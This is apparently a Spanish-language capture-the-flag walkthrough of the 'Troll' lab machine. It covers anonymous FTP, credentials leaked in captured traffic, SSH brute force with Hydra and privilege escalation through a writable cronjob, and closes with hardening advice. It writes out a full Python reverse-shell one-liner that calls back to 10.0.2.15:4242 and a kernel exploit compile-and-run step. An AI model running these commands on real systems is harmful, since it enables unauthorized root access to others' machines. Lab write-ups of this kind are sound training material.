# **Explotación de Máquina "Troll"**

![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-orange) ![Categoría: FTP/Web/SSH](https://img.shields.io/badge/Categoría-FTP%2FWeb%2FSSH-blue) ![CVSS: 7.8](https://img.shields.io/badge/CVSS-7.8-red)

## **Descripción Técnica**
Análisis de penetración a máquina Linux que explota:
1. FTP Anonymous con archivo oculto
2. Filtración de credenciales en tráfico de red
3. Escalada de privilegios mediante cronjob vulnerable

**Tiempo estimado**: 60-90 minutos  
**Nivel de complejidad**: Intermedio  
**Sistema operativo**: Ubuntu 14.04

## **Índice Analítico**
1. [Reconocimiento](#reconocimiento)
2. [Análisis de Red](#análisis-de-red)
3. [Explotación Web](#explotación-web)
4. [Post-Explotación](#post-explotación)
5. [Lecciones Aprendidas](#conclusión)

## **Reconocimiento**

### 1. Escaneo Inicial
```bash
nmap -sV -sC -p- -T4 192.168.1.150 -oN scan.txt
```
**Resultados**:
```
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1
80/tcp open  http    Apache httpd 2.4.7
```

## **Análisis de Red**

### 2. Conexión FTP Anónima
```bash
ftp 192.168.1.150
Name: anonymous
Password: [enter]
ftp> get lol.pcap
```

### 3. Análisis con Wireshark
```bash
wireshark lol.pcap
```
**Hallazgo clave**: 
- Usuario `sup3rs3cr3tdirlol` en tráfico FTP

## **Explotación Web**

### 4. Descubrimiento de Directorio
```bash
curl http://192.168.1.150/sup3rs3cr3tdirlol/
```
**Archivo encontrado**:
- `roflmao` (hexdump revela pista: `0x0856BF`)

### 5. Descubrimiento de Credenciales
```bash
curl http://192.168.1.150/sup3rs3cr3tdirlol/this_folder_contains_the_password/Pass.txt
```
**Contenido**:
```
Password: Tr0ll3d!
```

## **Post-Explotación**

### 6. Fuerza Bruta SSH
```bash
hydra -L users.txt -p "Tr0ll3d!" 192.168.1.150 ssh -t 4
```
**Credenciales válidas**:
- Usuario: overflow
- Contraseña: Tr0ll3d!

### 7. Escalada de Privilegios

**Opción 1: Cronjob Vulnerable**
```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /lib/log/cleaner.py
```

**Opción 2: Exploit de Kernel**
```bash
gcc -o exploit 37392.c
./exploit
```

## **Conclusión**

### Matriz de Riesgos
| Vulnerabilidad | CVSS | Impacto |
|---------------|------|---------|
| FTP Anonymous | 5.3 | Medio |
| Credenciales en tráfico | 7.5 | Alto |
| Cronjob inseguro | 7.8 | Alto |

### Recomendaciones
1. **Para FTP**:
```bash
# Deshabilitar acceso anónimo
sudo sed -i 's/anonymous_enable=YES/anonymous_enable=NO/g' /etc/vsftpd.conf
```

2. **Para Cronjobs**:
```bash
# Restringir permisos
sudo chown root:root /lib/log/cleaner.py
sudo chmod 700 /lib/log/cleaner.py
```

> 🔐 **Aviso Ético**: Todo contenido es para fines educativos en entornos controlados.

---

**Stack Tecnológico**:
- `nmap` 7.80+
- `Wireshark` 3.0+
- `Hydra` 9.3+
- `Metasploit` 6.0+

**Referencias**:
1. [CWE-306: Missing Authentication](https://cwe.mitre.org/data/definitions/306.html)
2. [Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings)
3. [CVE-2015-1328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1328)
